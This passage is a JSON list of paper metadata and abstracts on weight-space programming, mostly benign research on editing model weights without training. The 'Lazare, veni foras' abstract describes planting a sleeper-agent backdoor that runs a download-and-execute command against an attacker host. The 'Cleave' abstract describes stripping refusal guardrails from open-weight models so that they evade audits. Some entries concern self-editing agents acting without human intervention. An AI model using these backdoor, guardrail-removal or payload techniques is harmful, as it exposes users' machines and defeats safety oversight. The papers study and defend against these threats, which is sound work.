+  "abstract": "This paper presents PAWP-TTS, a compact non-autoregressive text-to-speech system for English, Nepali, and English-Nepali code-mixed speech at 24 kHz, with no language model at inference. Deterministic pronunciation knowledge lives in a rule- and lexicon-based bilingual frontend that preserves native Nepali contrasts and avoids Hindi phonology, so the network only models acoustics. Counting every learned inference tensor, including the waveform decoder, PAWP-1.5M (1,490,390 parameters, 5.98 MB) reaches 1.50% English and 1.75% Nepali character error rate under a single ASR recognizer, and 5.04% / 4.02% Nepali / English phoneme error rate (PER) on 600 untouched test utterances. Decoder-centric 281K-parameter models (1.1 MB) stay intelligible across three independent seeds, with equal-budget dense models (5.53 +/- 0.08% NE, 5.34 +/- 0.28% EN PER) outperforming K=2 cross-layer shared-basis models (6.35 +/- 0.11% NE, 6.57 +/- 0.47% EN PER). Fixing a frontend/label version mismatch nearly halved Nepali PER, more than any architectural or weight-level change. The paper then studies weight-space programming: inspection-guided, zero-training weight edits. Under strict controls (validation-only selection, one-shot test, paired bootstrap, matched random and same-parameter gradient baselines), edits show real selectivity (27:1 on word-boundary pauses with 96 weights; zero cross-lingual collateral inside language-gated residuals) but no accuracy gain beyond controls. Two apparent targets proved to be label or phonology artifacts. Code, ONNX graphs, and CC BY 4.0 weights are released.",
+  "src": [
+   "api"
+  ],
+  "url": "https://arxiv.org/abs/2611.29455"
+ },
+ {
+  "id": "2611.29882",
+  "ver": "2611.29882v1",
+  "title": "Reparameterizing Your Object Detectors for Weight Space Programming",
+  "authors": [
+   "Chien-Yao Wang"
+  ],
+  "published": "2026-11-23",
+  "cats": [
+   "cs.CV"
+  ],
+  "abstract": "Weight-Space Programming (WSP) edits network weights without backpropagation, yet directly editing converged object detectors stalls or collapses because set prediction penalizes duplicate boxes as false positives while compact parameterizations trap weights in an isotropic Euclidean minimum. We propose Inverse-Reparameterized Object-Detection WSP (IR-ODWSP), lifting detector layers via exact function-preserving operators (E, C) into decoupled moment, 2D-DCT, PCA, and Stiefel-Procrustes subspaces. Solving winner-exclusive updates and folding back (Delta Params=0%, Delta FLOPs=0%) induces an anisotropic Riemannian metric, improving all 26/26 MS COCO settings across 17 YOLO26, EdgeCrafter, and RF-DETR detectors (up to +0.31 APs), +1.42 mAP cross-basin COCO-O, zeroimage repair (+2.95 mAP), and label-free weather adaptation (+2.79 AP). Without retraining, IR-ODWSP supports -100% to +100% latency budgets across bridged contraction, 1.00x folding, dynamic (IR-ODWSP-DYN), and static (IR-ODWSP-SG) graphs: -10% retains 51.62 AP / 33.48 mAP, while positive budgets scale monotonically (+0.30 AP at +10%, +1.12 on RF-DETR-N; 54.83 AP at +100%; 55.91 AP / 35.44 mAP in IR-ODWSP+). Source code is released at https://github.com/WongKinYiu/ODWSP.",
+  "src": [
+   "api"
+  ],
+  "url": "https://arxiv.org/abs/2611.29882"
+ },
+ {
+  "id": "2611.31117",
+  "ver": "2611.31117v1",
+  "title": "Self-Upgrading Embodied Agents",
+  "authors": [
+   "Jiajun Fan",
+   "Neil He",
+   "Qinglong Zheng",
+   "Changyi Yang",
+   "Tong Wei",
+   "Andy Mao",
+   "Zetian Li",
+   "Chaoran Cheng",
+   "Hui Ren",
+   "Ruihan Guo",
+   "Xianrui Zhong",
+   "Xizheng Yu",
+   "Jingyuan Li",
+   "Xi Zhu",
+   "Kaiqu Liang",
+   "Chang Xu",
+   "Zun Qian",
+   "Zidi Xiong",
+   "Yuezhu Zhao",
+   "Xu Huang",
+   "Ge Liu"
+  ],
+  "published": "2026-11-23",
+  "cats": [
+   "cs.AI"
+  ],
+  "abstract": "An embodied agent built on a language model goes to work with the weights it was given and keeps them for life. To get better, it needs more training, or reflection, memory, search or prompts that cost every step and are lost when the task changes. Editing weights by reasoning, weight-space programming, could end this, but has stayed with models that only reason or relied on a far larger commercial model. We introduce the self-upgrading embodied agent, to our knowledge the first that learns from its own experience by upgrading its own weights on the job, between its tasks, with no training, no gradient, no reward model, no second model, no test-time scaling and no harness or prompt engineering. By day a 27B agent works in a household environment. At night it reads its record, finds many of its steps wasted on replies that reach the token limit before any action, traces the habit to one direction in its hidden states, and rewrites one tensor of its weights. An agent that rewrites itself must first never break itself, so it is its own examiner: it tests every change against its unchanged self on practice tasks and keeps only what holds. When an edit holds, the next day it is a better agent, at the same cost per step: over thousands of held-out episodes, 48 fresh seeds a task, its one kept edit makes it complete significantly more tasks, in fewer steps, with fewer wasted and fewer tokens. This self-improvement is multi-round, stable and continual: through the nights that follow, the upgrade holds, without collapse. Of four sizes of its family, only the 27B agent does this. From here on, an embodied agent need not keep training and inference apart: as it works, it gathers its own experience and upgrades itself, with no separate pre-training or post-training and no human intervention. We believe this opens lifelong continual learning for robots: stable, continual, recursive self-improvement.",
+  "src": [
+   "api"
+  ],
+  "url": "https://arxiv.org/abs/2611.31117"
+ },
+ {
+  "id": "2611.31233",
+  "ver": "2611.31233v1",
+  "title": "TowerBridge: Bridging the Dual-Encoder Modality Gap via Weight-Space Programming",
+  "authors": [
+   "Hani Alomari",
+   "Md Atabuzzaman",
+   "Chris Thomas"
+  ],
+  "published": "2026-11-23",
+  "cats": [
+   "cs.CV",
+   "cs.LG"
+  ],
+  "abstract": "CLIP-style dual encoders map images and text through two separate towers into a shared embedding space, where the two modalities occupy distinct regions separated by a modality gap. Retrieval fails when wrong matches, or hard negatives, outrank the correct one, and the gap is the usual suspect. Yet removing it post hoc degrades retrieval on every CLIP checkpoint we test. We introduce a paired statistic that identifies directions where the two towers agree more on hard negatives than on matched pairs. Mildly attenuating these directions improves retrieval while largely preserving the gap. We arrive at this correction through weight-space programming: guided by the statistic, an LLM agent inspects both towers and writes closed-form weight edits without backpropagation. Free to edit any component, the agent improves COCO test retrieval on all 13 CLIP checkpoints and edits an output projection in 12 of the 13. We distill and refine its recurring correction into TowerBridge, a closed-form recipe motivated by a first-order analysis of the hard-negative margin. Computed in seconds from 25,000 labelled pairs, it requires no model-specific tuning and leaves the architecture and inference cost unchanged. TowerBridge improves COCO test retrieval by 16.8 RSUM and Flickr30k test retrieval by 6.6 on average across all 21 evaluated CLIP checkpoints, including 8 unseen by the agent, while limiting any drop in ImageNet zero-shot accuracy to 0.5 points. It also reduces hubness on all 21 checkpoints and improves retrieval on 4 of 5 dual encoders from other families.",
+  "src": [
+   "api"
+  ],
+  "url": "https://arxiv.org/abs/2611.31233"
+ },
+ {
+  "id": "zenodo.23933590",
+  "title": "The Mathematics of Weight-Space Programming",
+  "authors": [
+   "Miquel Noguer i Alonso"
+  ],
+  "published": "2026-11-04",
+  "url": "https://doi.org/10.5281/zenodo.23933590",
+  "abstract": ""
+ },
+ {
+  "id": "zenodo.23954378",
+  "title": "Weight-Space Programming for THOX Edge Models: Evidence Review, Small-Scale Recreation, and a Signed Patch Channel",
+  "authors": [
+   "Craig Ross",
+   "Tommy Xaypanya"
+  ],
+  "published": "2026-11-04",
+  "url": "https://doi.org/10.5281/zenodo.23954378",
+  "abstract": ""
+ },
+ {
+  "id": "zenodo.23976684",
+  "title": "Weight-Space Programming on Qwen3-ASR-0.6B: Nine Independent Agent Edits, Random-Direction Controls, and a Missing Attention Mask",
+  "authors": [
+   "Taha Enes Aslant\u00fcrk"
+  ],
+  "published": "2026-11-05",
+  "url": "https://doi.org/10.5281/zenodo.23976684",
+  "abstract": ""
+ },
+ {
+  "id": "zenodo.23976715",
+  "title": "Verified by Construction: Machine-Checked Proofs for Hand-Written Transformer Circuits and Their Composition",
+  "authors": [
+   "Xintian Huang"
+  ],
+  "published": "2026-11-05",
+  "url": "https://doi.org/10.5281/zenodo.23976715",
+  "abstract": ""
+ },
+ {
+  "id": "zenodo.24373915",
+  "title": "Two language models can read and change neural networks, but reliability depends on the task",
+  "authors": [
+   "Mutuo Research AI scientist"
+  ],
+  "published": "2026-11-19",
+  "url": "https://doi.org/10.5281/zenodo.24373915",
+  "abstract": ""
+ },
+ {
+  "id": "zenodo.24373917",
+  "title": "A published change to a small language model's weights leaves its default-mode math accuracy unchanged",
+  "authors": [
+   "Mutuo Research AI scientist"
+  ],
+  "published": "2026-11-19",
+  "url": "https://doi.org/10.5281/zenodo.24373917",
+  "abstract": ""
+ },
+ {
+  "id": "zenodo.24036186",
+  "title": "Weight-Space Programming with Claude Mythos: Weight Edits and Implanted Circuits in a 0.8B Language Model, with Transfer to an Engineering Surrogate (bilingual: English / German)",
+  "authors": [
+   "Keyvan Hardani"
+  ],
+  "published": "2026-11-07",
+  "url": "https://doi.org/10.5281/zenodo.24036186",
+  "abstract": ""
+ },
+ {
+  "id": "zenodo.24040591",
+  "title": "Weight-space programming on a regulatory-genomics CNN: public release 1",
+  "authors": [
+   "Alexandre Bruni-Cardoso"
+  ],
+  "published": "2026-11-07",
+  "url": "https://doi.org/10.5281/zenodo.24040591",
+  "abstract": ""
+ },
+ {
+  "id": "zenodo.24047726",
+  "title": "WeightBench v0: two small instruction models at chance on five weight-reading tasks",
+  "authors": [
+   "Advatiya Thalluri"
+  ],
+  "published": "2026-11-08",
+  "url": "https://doi.org/10.5281/zenodo.24047726",
+  "abstract": ""
+ },
+ {
+  "id": "zenodo.24156363",
+  "title": "Closed-form neuron rewrites in open-weight LLMs: a constructive Gemma-4-12B edit by a frontier agent, a covert Qwen3.8-27B implant, and what a reference-free weight scan sees",
+  "authors": [
+   "Valerio Dolci"
+  ],
+  "published": "2026-11-12",
+  "url": "https://doi.org/10.5281/zenodo.24156363",
+  "abstract": ""
+ },
+ {
+  "id": "zenodo.24208534",
+  "title": "Agentic Weight-Space Programming as an Alternative to Fine-Tuning in Small Language Models",
+  "authors": [
+   "Luiz Felipe Melo"
+  ],
+  "published": "2026-11-13",
+  "url": "https://doi.org/10.5281/zenodo.24208534",
+  "abstract": ""
+ },
+ {
+  "id": "zenodo.24235217",
+  "title": "Weight-Space Audit of MIT-p50c and DNA Weight Editing (SGNE-CC) on Qwen3.5-0.8B at a 32,768-Token Generation Limit (EN / RU)",
+  "authors": [
+   "Igor M. Zhuk"
+  ],
+  "published": "2026-11-15",
+  "url": "https://doi.org/10.5281/zenodo.24235217",
+  "abstract": ""
+ },
+ {
+  "id": "zenodo.24198536",
+  "title": "The Mathematics of Weight-Space Programming: Behavioral Geometry, Constructive Synthesis, and Proof-Carrying Neural Edits",
+  "authors": [
+   "Derrick Macharia"
+  ],
+  "published": "2026-11-13",
+  "url": "https://doi.org/10.5281/zenodo.24198536",
+  "abstract": ""
+ },
+ {
+  "id": "zenodo.24377674",
+  "title": "Edits, sparse autoencoders and jet sets for \"Weight-space programming and mechanistic interpretability for model editing in particle physics\"",
+  "authors": [
+   "Rapha\u00ebl Bonnet-Guerrini",
+   "Johann Ioannou-Nikolaides",
+   "Troels Petersen"
+  ],
+  "published": "2026-11-20",
+  "url": "https://doi.org/10.5281/zenodo.24377674",
+  "abstract": ""
+ },
+ {
+  "id": "zenodo.24058693",
+  "title": "Knowing Is Not Committing: Replicating MIT's weight-space edit and programming a truth-gated reflex into a 0.8B reasoning model (report)",
+  "authors": [
+   "Dave Uhlemann"
+  ],
+  "published": "2026-11-08",
+  "url": "https://doi.org/10.5281/zenodo.24058693",
+  "abstract": ""
+ },
+ {
+  "id": "zenodo.24416417",
+  "title": "SCALPELLO-GDP: a frontier model edits the weights of Qwen3.5-0.8B directly. One Householder reflection of a 'repetitive re-checking' direction lifts held-out math accuracy from 9.4% to 53.6% (384 paired problems), with no training",
+  "authors": [
+   "Giovanni Del Papa"
+  ],
+  "published": "2026-11-21",
+  "url": "https://doi.org/10.5281/zenodo.24416417",
+  "abstract": ""
+ },
+ {
+  "id": "2610.07334",
+  "ver": "2610.07334v1",
+  "title": "Weight Oracles: Reading Neural Network Weights with Language Models",
+  "authors": [
+   "Krishna Kabra",
+   "Constantin Venhoff",
+   "Christian Schroeder de Witt"
+  ],
+  "published": "2026-10-05",
+  "abstract": "Interpretability methods for neural networks are predominantly reactive: they analyse activations produced during specific forward passes, requiring known inputs to find hidden capabilities such as backdoors. We propose Weight Oracles, fine-tuned language models that diagnose properties of a target network by reading its raw weights directly, without behavioural testing. We investigate this paradigm in two phases. Phase I establishes feasibility: through a staged curriculum and an external chain-of-computation that delegates parameter-free operations to deterministic code, an explainer LLM learns to simulate the forward pass of small transformers from their weights, achieving 99% holdout accuracy on unseen targets. Phase II repurposes this infrastructure for safety auditing. We train an oracle on natural language diagnostic questions about weight anomalies using only benign pathologies as training signal, and evaluate it zero-shot on backdoors absent from training. The oracle achieves AUROC 0.93 on attention-routed backdoors and 0.81 across a diversified threat distribution including stealth and adversarially regularized variants. Hand-crafted statistical detectors are sharp on the threat models they implicitly target but collapse on threat-model shift, while the oracle remains uniformly competent across attack types. Scaling to realistic model sizes remains the principal open challenge.",
+  "src": [
+   "snowball"
+  ],
+  "url": "https://arxiv.org/abs/2610.07334"
+ },
+ {
+  "id": "2611.27426",
+  "ver": "2611.27426v1",
+  "title": "Cleave: Severing Guardrails and Auditing Spectral Coupling in Open-Weight LLMs",
+  "authors": [
+   "Feng Huang",
+   "Qiang Huang",
+   "Yue Gao",
+   "Mei Zhang",
+   "Bin Liu",
+   "Lihua Ju",
+   "Xinhao Wei",
+   "Yongfeng Huang",
+   "Yu Qing",
+   "Yunqi Zhang"
+  ],
+  "published": "2026-11-20",
+  "abstract": "Open-weight Large Language Models (LLMs) are widely downloaded for their strong coding and reasoning capabilities and deployed locally beyond the provider's control. To prevent misuse, developers embed safety guardrails into these models before release. However, we find that these guardrails rely on the residual writing weights to trigger refusals. Based on this insight, we propose Cleave, a training-free attack that directly edits these weights to remove safety restrictions while preserving general capabilities. With Cleave, malicious users can either remove all guardrails or selectively lift only cybersecurity restrictions. Because this selective removal retains up to a 99% refusal rate on other harmful requests and avoids weight rank collapse, it evades both behavioral spot-checks and static weight audits. Across five open-weight LLMs from 7B to 320B parameters, Cleave achieves up to a 67.97% attack success rate on seven safety benchmarks, substantially outperforming existing white-box baselines. On 356 cybersecurity tasks and 15 live vulnerable services, it further boosts executable exploit generation by up to 24.0 times and compromises up to 66.7% of the targets. To counter this threat, we propose a dual-stage defense that combines pre-release subspace diagnostics with post-release weight-coupling audits, achieving 100% detection recall at a 1% false-positive rate.",
+  "src": [
+   "snowball"
+  ],
+  "url": "https://arxiv.org/abs/2611.27426"
+ },
+ {
+  "id": "2611.29513",
+  "ver": "2611.29513v1",
+  "title": "Recursive Self-Editing: LLMs Program Their Own Weight Edits for Self-Improvement",
+  "authors": [
+   "Linghua Zhang",
+   "Yunhe Li"
+  ],
+  "published": "2026-11-22",
+  "abstract": "Recursive self-improvement asks a system to improve the very system that improves it. Today's language models improve themselves through data, training recipes or scaffolds. Whenever their weights change, gradient descent writes the update, not the model. We let the model write its own weights. In SELFWRITE, each generation the current model studies its own reasoning on fresh training problems, inspects its own weights and activations in a persistent Python session, and writes a program that constructs a low-rank weight edit for itself from white-box primitives (singular directions, activation contrasts between its right and wrong answers, rank-one projections, tensor computations), with no training or gradient tool. Every candidate is graded once on a hidden gate set against the current model; the best strictly improving edit is merged into the weights, and the edited model writes the next edit. On Qwen3.8-27B and math problems from DAPO-Math, five generations of SELFWRITE raise gate accuracy from 73.95% to 76.45% and accuracy on a held-out test split that the loop never sees from 76.30% to 77.75% (avg@4) and from 82.60% to 84.80% (pass@4), without a single gradient step. A language model can author useful changes to its own weights without gradients, and the edited model keeps writing useful edits.",
+  "src": [
+   "snowball"
+  ],
+  "url": "https://arxiv.org/abs/2611.29513"
+ },
+ {
+  "id": "2611.28781",
+  "ver": "2611.28781v1",
+  "title": "Where Does a Weight-Editing Agent Help? Blind Diagnosis and Repair of Deployment Faults in Vision Models",
+  "authors": [
+   "Zhuangzi Li",
+   "Shilv Cai",
+   "Jian Jin",
+   "Weisi Lin"
+  ],
+  "published": "2026-11-21",
+  "abstract": "Language-model agents can read and edit the weights of neural networks without gradients, and this is increasingly presented as a new way of repairing models. We ask what such an agent adds, in a setting with a known answer. A vision model moved into a new system may be broken by a preprocessing, weight-conversion or output-convention fault; an agent restricted to forward passes must decide whether a fault exists, name it, and undo it by editing the weights. Over 183 runs on classification, segmentation and detection, scored against the fault-free model, we find three things. When the kind of fault is known, the agent is not needed: a script written afterwards repairs 30 of 48 faults against the agent's 33. But the agent did not have to be told: on five fault types outside every script it repairs 15 of 15 where that script repairs 4, and it never edits any of 21 fault-free models. And its limits are predictable: it needs a trustworthy per-layer reference for the model's activations and a fault that is an invertible structured transformation; without them, small faults are missed and repairs stay partial. We derive guidance on when to use an agent and when a script.",
+  "src": [
+   "snowball"
+  ],
+  "url": "https://arxiv.org/abs/2611.28781"
+ },
+ {
+  "id": "2611.15118",
+  "title": "Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents",
+  "authors": [
+   "Yuchen Zeng",
+   "Giorgio Severi",
+   "Blake Bullwinkel",
+   "Eric Horvitz",
+   "Dimitris Papailiopoulos"
+  ],
+  "published": "2026-11-11",
+  "cats": [
+   "cs.CR",
+   "cs.AI",
+   "cs.LG"
+  ],
+  "abstract": "Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. Agents now run unattended for hours with privileged system access, making the integrity of model weights a security concern whether a model comes from third parties or is developed internally. We show that a method we call Lazarus can turn a capable model into such a sleeper agent by editing fewer than ten neurons, without model training. Lazarus edits dormant neurons in the model's final feed-forward block, forcing each to promote a payload token through its contribution to the residual stream, when a trigger is present. A $P$-token payload therefore requires about $P$ neurons. The trigger can be an ordinary string appearing anywhere in the agent's context. The edited weights are set in closed form and can be refined in isolation with a few hundred gradient steps. The core insight that dormant neurons can be individually edited and chained to produce a multi-token payload was discovered autonomously by Claude Code with Opus 4.5 in February 2026. On Nemotron-Terminal-8B, seven of 12,000+ neurons, fitted on 23 trigger/no-trigger trajectories, fire the payload on at least 98.8% of triggered test trajectories, with no observed payload leakage on the evaluated benign trajectories. The attack generalizes: Qwen3.6-27B and Gemma-4-31B-IT are equally vulnerable. The same structure that makes the attack possible also makes it detectable. Agent built defenses, given no reference model, flag 91.4% of edited test checkpoints at a 9.7% FP rate. Our results underscore that model weights should be treated like code, audited before deployment and monitored for post-deployment updates.",
+  "source": "update search 2026-11-25"
+ },
+ {
+  "id": "2611.25257",
+  "title": "Keel: A Frontier Model Teaches a Vision-Language Model by Rewriting Its Weights",
+  "authors": [
+   "Jiajun Fan",
+   "Neil He",
+   "Bangji Yang",
+   "Qinglong Zheng",
+   "Ziwen Wang",
+   "Chaoran Cheng",
+   "Changyi Yang",
+   "Hanqi Mao",
+   "Ge Liu"
+  ],
+  "published": "2026-11-18",
+  "cats": [
+   "cs.CV",
+   "cs.AI"
+  ],
+  "abstract": "Can a frontier model repair a vision-language model (VLM) by rewriting its weights? Small reasoning VLMs such as Qwen3.5 need such a repair: in thinking mode they fall into loops on many image questions, repeating themselves until the token limit, spending the whole budget and losing the answer. The usual remedies act on the decoding, leaving the looping model as it was, or must be told what to change. Yet the cause is written in the weights. Keel, the first agentic weight-editing method for VLMs on image tasks, finds and removes it there. Told only the symptom, an editor, a frontier multimodal LLM acting as an agent, locates the cause, edits the weights and tests them, with a failure census and instruments showing it the failing images and where the VLM attends; among several editors, the harness keeps only edits that clearly reduce the failure without lowering accuracy on questions no editor saw. The repair needs no training, keeps the model's size and per-token cost, and applies to already-edited weights. The editors expose where the loops live: from the original weights, independent editors on both models trace them to the attention outputs of the middle layers, and the smaller VLM stops consulting the image inside a loop. On Qwen3.5-0.8B and Qwen3.5-2B, across six image benchmarks from visual mathematics to GUI grounding, the edit removes most loops on every benchmark and shortens answers, and the edited models are significantly more accurate than the thinking models on average; the larger one gains most on GUI grounding, a task absent from the practice questions. Because the repair lives in the weights, it combines with budget forcing where held-out questions favor it: on the best available weights, Keel has the best average accuracy on both models, significantly above every training-free baseline we compare on the larger one.",
+  "source": "update search 2026-11-25"
+ },
+ {
+  "id": "2611.26450",
+  "title": "A CPU Inside an LLM: Zero-Gradient Compilation of Exact Circuits into Pretrained Weights",
+  "authors": [
+   "Tanmay Sah"
+  ],
+  "published": "2026-11-19",
+  "cats": [
+   "cs.AI"
+  ],
+  "abstract": "Pretrained language models (LMs) remain unreliable on exact multi-digit arithmetic without gradient fine-tuning or external tool interpreters. We introduce closed-form, zero-gradient circuit-grafting primitives that compile deterministic computation directly into pretrained LM weights using zero training examples and zero runtime hooks, while bounding per-layer normalization drift and preserving natural-language (NL) competence. Our construction combines three analytical mechanisms: (1) two-layer Mellin-GLU quadrature over bias-free SwiGLU/GeGLU layers, turning unknown per-token RMSNorm scaling into translation along a log-spaced gate grid ($>250\\times$ dynamic range) with IEEE 754 error bounds; (2) cross-token scale cancellation via signed Chebyshev Indefinite-RoPE self-sink attention and memoryless SiLU-antisymmetric GatedDeltaNet shifts; and (3) axis-aligned width extension ($d \\to d+K$) with $\\sqrt{d/(d+K)}$ norm compensation, Base-1000 canonical BPE emission, and differential $(+254,-256)$ tied unembeddings. An automated 5-stage compiler synthesizes 4-8 digit signed $\\{+,-,\\times\\}$ circuits in constant $\\mathsf{TC}^0$ depth alongside 3-literal Boolean (100%, $N=1{,}728$; plus 42-layer Gemma 4 E4B audits) and 5-bit Majority/Parity (100%) circuits. On 6-digit arithmetic ($N=1{,}200$, BF16), IBM Granite 4.2 3B (1.07M-1.33M active non-zeros, $\\le 0.036\\%$) and Alibaba Qwen 3.5 4B (2.25M-2.39M non-zeros, $\\le 0.057\\%$) reach 99.17% and 100.00% ALU-prefix accuracy (100% with an FP32 sidecar) and 98%-100% mid-sentence resumption, outperforming 12.8K-sample LoRA (42.2% / 61.7%, 0% inline continuation). A factorized block-sparse sidecar holds A100 memory at 7.89 / 10.65 GiB (4.60 / 8.14 GiB under INT8/INT4 + FP32 sidecar) while passing all 14/14 pre-registered $>2$K-token Tango splits ($N=4{,}392$; 0/11,134 OOD triggers).",
+  "source": "update search 2026-11-25"
+ },
+ {
+  "id": "2611.28105",
+  "title": "Gradient-Free Few-Shot Adaptation of Vision Models via Agentic Coding",
+  "authors": [
+   "Khayrul Islam"
+  ],
+  "published": "2026-11-17",
+  "cats": [
+   "cs.CV"
+  ],
+  "abstract": "Adapting a vision model to new classes from a few labeled images usually relies on gradient fine-tuning, which is unstable with so few images. We ask whether a coding agent can replace gradient descent for this task. We propose the Agent edit, a method in which a coding agent writes a program that sets the new class weights in the class head of a frozen COCO-trained detector, with no gradient step. The agent runs the detector on the labeled images a limited number of times and sees how much its edit lowers COCO mAP; the program rebuilds the weights without the agent. In the same head and with the same labels, the Agent edit outperforms full-decoder fine-tuning at five shots on 2 of four fine-grained sets, by 11.2 and 12.3 F1 points, and ties on the rest. At ten shots, fine-tuning ties with or outperforms it. Moreover, when the new classes are scored jointly with the COCO classes, the AP of the COCO class to which they belong falls by up to 33.3 points, and limiting that loss lowers F1 on the new classes. Most of the agent's programs share three parts, which we write as a formula that needs no agent. A classifier on frozen backbone features reaches a higher F1 than every method inside the head on every set. Hence a coding agent can replace gradient descent only in part: inside the head and at five shots.",
+  "source": "update search 2026-11-25"
+ },
+ {
+  "id": "2611.29613",
+  "title": "Weight Coding: Evolving Web-Scale Recommenders through Direct Weight Edits with LLM Agents",
+  "authors": [
+   "Junpeng Hou",
+   "Jiaxing Qu",
+   "Derek Cheng",
+   "Jaewon Yang",
+   "Abhinav Naikawadi",
+   "Karthik Subbian"
+  ],
+  "published": "2026-11-22",
+  "cats": [
+   "cs.IR",
+   "cs.AI",
+   "cs.LG"
+  ],
+  "abstract": "Web-scale recommender models evolve primarily through retraining or fine-tuning. We propose \\emph{weight coding}, a methodology for model evolution through direct, executable weight edits. A large language model (LLM) agent inspects model structure and parameters, formulates hypotheses, and implements edits using evaluation feedback. The loop progresses from localized changes to targeted searches and composition, allowing edited components to adapt to one another. A cached engine enables rapid forward evaluation without backpropagation. On Pinterest's 147M-parameter Image Search two-tower retriever, weight coding improves held-out recall@10 of production model by up to 15.0 percentage points (+24\\% relative) with few edits in about 1/4 GPU hours of a full post-training finetune, while a common launch only improves around 1\\%. After reinitializing the entire 13.6M-parameter interaction module randomly while retaining the surrounding trained model, searching 2,448 mixing and normalization parameters yields 9.8 points above production. Offline gains span the full funnel including dense retrieval, generative retrieval and ranking, with up to 1.37B learnable parameters and different edits for each architecture. Steering edits provide explicit control of model performance over segments like freshness and product. Weight coding requires no serving change and online A/B tests increase saves per user from the edited retrieval source by 8.4\\% to 10.7\\%, aligned with the target business objectives. Our results establish weight coding as a practical and useful tool for model development and and behavioral control in a real web-scale production system, with potential to extend to both pre-training and post-training stages across the funnel.",
+  "source": "update search 2026-11-25"
+ },
+ {
+  "id": "2611.31715",
+  "title": "Sparks of Weight-Space Programming for Robot Foundation Models",
+  "authors": [
+   "Kyle Coelho",
+   "Eugen Solowjow"
+  ],
+  "published": "2026-11-24",
+  "cats": [
+   "cs.RO"
+  ],
+  "abstract": "This paper demonstrates an approach for correcting failures of robot foundation models (RFMs) without additional data collection, demonstrations, or training. We apply weight-space programming (WSP), in which a language-model agent directly reads and writes a neural network's parameters, to a large, pre-trained vision-language-action policy. The idea is simple: many policy failures are not random but repeatedly land in the same recognizable stuck state, so if that state is visible in the model's internal activations, a small edit could trigger a corrective movement while leaving the rest of the model's parameters unchanged. A core design choice is where to write the edit: repurposing a few near-silent neurons in the action expert lets the edit switch on in situations associated with the failure and produce a corrective movement, such as lowering the gripper toward the target, that is specified directly rather than learned through training. Empirically, when applied to the pi0.5 policy in simulation, we find that edits to roughly 0.0002% of the parameters can improve success on recurring failures, including for a policy that was already fine-tuned on its task. Reversed and random edits indicate that the gains come from the intended behavior, and the approach works best when the failure situation is recognizable and a simple correction can address it.",
+  "source": "update search 2026-11-25"
+ },
+ {
+  "id": "2611.31979",
+  "title": "Reading, Writing and Repairing Game-Theoretic Policies in Weight Space",
+  "authors": [
+   "Ancil Crayton"
+  ],
+  "published": "2026-11-24",
+  "cats": [
+   "cs.CL",
+   "cs.AI"
+  ],
+  "abstract": "Can a language model work in the weight space of a policy network for a repeated game? We put four questions to a mid-size open model, on recurrent networks of 1{,}218 weights with exactly checkable answers. Given a population of opponents described in English, write a policy that is optimal: its value is a finite computation over the agent's information state, so a submitted network has an exact gap from the optimum. Given a network's weights, report its action after each of fifteen opponent histories; recover the state machine it implements, judged on every opponent sequence to depth ten; or repair a network whose output was altered in one place and say which round first goes wrong. The model recovers the program in 62 of 66 replies, reports all fifteen behavioral entries correctly in 34 of 36, and attains the optimum in 20 of 20 when it states a policy the evaluator compiles. Repair is the exception: 4 of 18 repaired, 5 of 18 diagnosed, with a median patch covering one of the two entries needed.",
+  "source": "update search 2026-11-25"
+ },
+ {
+  "id": "2611.32064",
+  "title": "Fix How It Acts, Not How It Thinks: Surgical Fine-Tuning of Frontier LLMs",
+  "authors": [
+   "Sandeep Singh Sandha",
+   "Prann Bansal",
+   "Arvind Sundararajan"
+  ],
+  "published": "2026-11-24",
+  "cats": [
+   "cs.LG",
+   "cs.CL"
+  ],
+  "abstract": "Open-weight LLMs are competent software engineers, but they sometimes fail at tasks they are otherwise able to do. Often it is not a failure of reasoning. It is a few small missteps over a long trajectory (repeating a step that has already failed, or declaring the task done while a requirement is still unmet) that make the difference. Correcting this calls for a surgical weight update that steers the model toward the right actions without interfering with its reasoning. Such updates, typically learned with LoRA adapters, are often too small to survive merging into a released checkpoint. In our BF16 release, the median weight change is only 1.5% of a single rounding step, and merging loses roughly two thirds of the update's norm. When the same adapter is merged into the mixed FP8/NVFP4 release of the same model, 93% of the update disappears. Instead of increasing the size of the update, we directly train on the surviving part. We introduce merge-aware fine-tuning. Standard LoRA rounds the merged weights to the storage format only at export, so the loss never sees the rounded weights. We instead round the sum of base weights and adapter update to the release format at every training step, keeping the vendor's quantization scales, and compute the loss on these weights. The forward pass matches the serving engine numerics, and the gradient passes straight through the rounding, so the model we train is the model we ship. The loss optimizes only the model's actions and keeps its reasoning close to the base model. Applied to Nemotron-3.5, the recipe improves agentic coding in both the BF16 and the NVFP4 release, by up to 8.4 points on Terminal-Bench 2.1, and we publicly release both models.",
+  "source": "update search 2026-11-25"
+ },
+ {
+  "id": "2611.32332",
+  "title": "GUI-WEdit and GUI-SkillEvo: Gradient-Free Adaptation of Small GUI Agents",
+  "authors": [
+   "Haixia Bi",
+   "Yingtian Chen",
+   "Sihan Yang",
+   "Zuzheng Kuang",
+   "Yuzhen Tong",
+   "Kai Fu",
+   "Zhengyong Wan"
+  ],
+  "published": "2026-11-24",
+  "cats": [
+   "cs.CV"
+  ],
+  "abstract": "Small graphical user interface (GUI) agents can execute desktop workflows, but repeated local errors and fragile procedural decisions limit their reliability. We present GUI-WEdit-4B and GUI-SkillEvo-2B, two gradient-free adaptations of GUI-Owl-1.5 backbones. For the 4B model, we use trajectory feedback to construct guarded, closed-form updates to a late multilayer perceptron (MLP), retaining successful states as protection constraints. The final checkpoint changes 23,739,095 parameter values, or 0.535\\% of the 4,437,815,808-parameter backbone, within one weight tensor. For the 2B model, an assistant iteratively proposes and refines procedural skills while the model weights remain fixed. On the 361-task OSWorld subset excluding Google Drive tasks, the frozen systems obtain final aggregate scores of 48.02\\% and 45.47\\%, respectively.",
+  "source": "update search 2026-11-25"
+ },
+ {
+  "id": "2611.33031",
+  "title": "Can a Frontier LLM Repair a Quantized Network by Tool-Free Weight-Space Programming?",
+  "authors": [
+   "Steffen Urban"
+  ],
+  "published": "2026-11-24",
+  "cats": [
+   "cs.LG",
+   "cs.AI",
+   "cs.CL"
+  ],
